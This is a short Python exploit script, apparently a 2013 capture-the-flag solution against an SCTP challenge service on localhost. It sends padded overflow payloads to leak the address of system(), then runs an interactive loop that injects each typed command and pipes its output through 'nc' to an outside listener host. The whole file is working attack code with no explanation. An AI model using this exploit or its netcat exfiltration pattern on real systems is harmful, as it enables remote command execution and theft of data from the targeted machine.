#Evan Jensen (wont)
#07072013

import sctp
from time import sleep
from isis import *
chal=('localhost',2323)

listener='server.com 3535'
def send_msg(msg,chan):
	sk=sctp.sctpsocket_tcp(socket.AF_INET)
	sk.settimeout(2)
	sk.connect(chal)
	sk.sctp_send(msg,stream=chan)
	print sk.recv(0x10000)
	return sk

def pad(s,l):
	return s+'\0'*(l-len(s))


debuga=0x401120
debug=pack("Q",debuga)

def e():
	print "[*]Getting System"
	s=send_msg(pad('system',8*3)+debug+ 'A'*(0x800-8*4-1)+'\0' ,9)
	time.sleep(1)
	addr=s.recv(0x1000)
	print "[*]System: %s"%addr
	system=pack("Q",int(addr,16))
	while True:
		command=raw_input('$')
		command=command+'|nc '+listener
		print "Command len %d"%len(command)
		send_msg(pad(command,8*3)+system+'A'*(0x800-8*4-1)+'\0' ,9)
		
e()




